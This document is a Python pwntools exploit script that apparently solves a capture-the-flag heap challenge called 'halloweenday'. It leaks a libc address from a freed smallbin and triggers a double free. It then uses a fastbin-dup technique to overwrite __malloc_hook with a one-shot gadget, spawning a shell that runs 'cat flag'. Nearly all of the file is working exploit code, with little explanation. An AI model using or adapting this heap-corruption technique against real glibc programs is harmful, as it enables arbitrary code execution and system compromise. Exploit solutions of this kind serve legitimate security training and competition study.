from pwn import *

#context.log_level="debug"

s=process('./halloweenday')
e=ELF('./halloweenday')


def Accept(size, name):
	s.sendline("1")
	s.recv()
	s.sendline(size)
	s.recv()
	s.sendline(name)
	s.recv()

def Deny(index):
	s.sendline("2")
	s.recv()
	s.sendline(index) #start from 1
	s.recv()

def See():
	s.sendline("3")
	s.recv()
	s.sendline(index)
	s.recv()	

def allocate_ghost(name):
	s.sendline("4")
	s.recv()
	s.sendline(name)
	s.recv()

def free_ghost(name, index):
	s.sendline("4")	
	s.recv()
	s.sendline(name)
	s.recvuntil(">")
	s.sendline(index)
	s.recv()

def leak_ghost(name, index):
	s.sendline("4")
	s.recv()
	s.sendline(name)
	s.recv()
	s.sendline(index)
	arena=u64(s.recv(6)+"\x00"*2)
	print 'arena leaked!  : ' + str(hex(arena))
	s.recv()
	return arena	

def rest():
	s.sendline("5")

def bonus(index, data):
	s.sendline("19950610")
	s.recv()
	s.sendline(index)
	s.recv()
	s.sendline(data)
	s.recv()


s.recvuntil(">>")

Accept("111111", "1")
Accept("222222", "2")

allocate_ghost("pumpkin") # smallbin
allocate_ghost("pumpkin") # smallbin
allocate_ghost("pumpkin") # smallbin

free_ghost("nightmare", "1")
free_ghost("nightamre", "0") # free first smallbin

arena=leak_ghost("darkness!", "1") # arena leak
libc=arena-0x3c4b78
hook=libc+0x3c4b10

fake_chunk = hook-0x23 # 0x7f

print 'libc  leaked!  : ' + str(hex(libc))
print 'hook  leaked!  : ' + str(hex(hook))

Deny("2")
Deny("1") #double free trigger

bonus("0", p64(fake_chunk)) # fastbin_dup_into_stack

oneshot = libc + 0x4526a
print 'oneshot gadget : ' + str(hex(oneshot))

Accept("222222", "2")
Accept("111111", "\x00"*3+p64(0)*2+p64(oneshot)) # malloc hook overwrite

s.sendline("1")
s.recv()

s.sendline("pwnwiz") # call malloc hook
s.sendline("cat flag") # sh : cat flag

s.interactive()


